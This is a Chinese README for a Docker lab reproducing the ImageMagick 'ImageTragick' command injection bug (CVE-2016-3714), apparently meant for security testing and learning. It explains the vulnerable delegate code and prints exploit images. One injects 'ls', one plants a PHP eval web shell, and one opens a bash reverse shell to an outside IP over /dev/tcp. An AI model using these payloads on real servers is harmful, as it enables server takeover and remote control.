## ImageMagick 命令执行漏洞（CVE-2016–3714）环境

### 说明

 感谢 [@justkg](https://github.com/justkg) 提供原始环境。

### 漏洞信息

 * [ImageMagick Is On Fire — CVE-2016–3714](https://imagetragick.com/)
 * [ImageMagick: Multiple vulnerabilities in image decoder](http://pastebin.com/aE4sKnCg)
 * [Write Up: Remote Command Execute in Wordpress 4.5.1](http://ricterz.me/posts/Write%20Up%3A%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1?_=1462424557950)

5月3日，ImageMagick官方披露称，目前ImageMagick存在一处远程命令执行漏洞（CVE-2016–3714），当其处理的上传图片带有攻击代码时，可被远程执行任意代码，进而导致攻击者控制服务器。

ImageMagick是一款开源图片处理库，支持 PHP、Ruby、NodeJS 和 Python 等多种语言，使用非常广泛。包括 PHP imagick、Ruby rmagick 和 paperclip 以及 NodeJS imagemagick 等多个图片处理插件都依赖它运行。

### 漏洞相关代码

ImageMagick 在 `MagickCore/constitute.c` 的 `ReadImage` 函数中解析图片，如果图片地址是 `https://` 开头的，即调用 InvokeDelegate。

`MagickCore/delegate.c` 定义了委托，[第 99 行](https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L99)定义了要执行的命令。

```
99    "  <delegate decode=\"https\" command=\"&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;\"/>"
```

最终 `InvokeDelegate` 调用 [`ExternalDelegateCommand` 执行命令](https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L407)。

```
#if !defined(MAGICKCORE_HAVE_EXECVP)
  status=system(sanitize_command);
#else
  if ((asynchronous != MagickFalse) ||
      (strpbrk(sanitize_command,"&;<>|") != (char *) NULL))
    status=system(sanitize_command);
  else
    {
      pid_t
        child_pid;

```

### 镜像信息

本镜像中提供了本地测试 PoC 和 远程测试 PoC


类型 | 值
:-:|:-:
开放端口 | 80
远程 PoC | /poc.php

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:i_imagemagick_1
 ```

2. 启动环境

 ```
$ docker run -d -p 8000:80 --name=i_imagemagick_1 medicean/vulapps:i_imagemagick_1
 ```
 > `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

### PoC 与 Exp 使用

#### 本地测试

在容器中 `/poc.png` 文件内容如下：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://evalbug.com/"|ls -la")'
pop graphic-context
```

构建时已经集成在容器中，可手动修改第 3 行的命令。

在物理机上直接执行下面命令验证漏洞：

```
$ docker exec i_imagemagick_1 convert /poc.png 1.png
```

或进入 docker容器 shell 中执行：

```
$ convert /poc.png 1.png
```

如果看到 `ls -al` 命令成功执行，则存在漏洞。

#### 远程命令执行测试

远程命令执行无回显，可通过写文件或者反弹 shell 来验证漏洞存在。

1. 写一句话到网站根目录下：

 ```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/1.jpg"|echo \'<?php eval($_POST[\'ant\']);?>\' > shell.php")'
pop graphic-context
 ```

2. 反弹 shell:

 ```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/1.jpg"|bash -i >& /dev/tcp/192.168.1.101/2333 0>&1")'
pop graphic-context
 ```

将上述两个 Exp 经过 base64 编码后发送到远程 `poc.php`，querystring 的 `key` 为 `img`。

也可修改 `poc.py` 后执行。
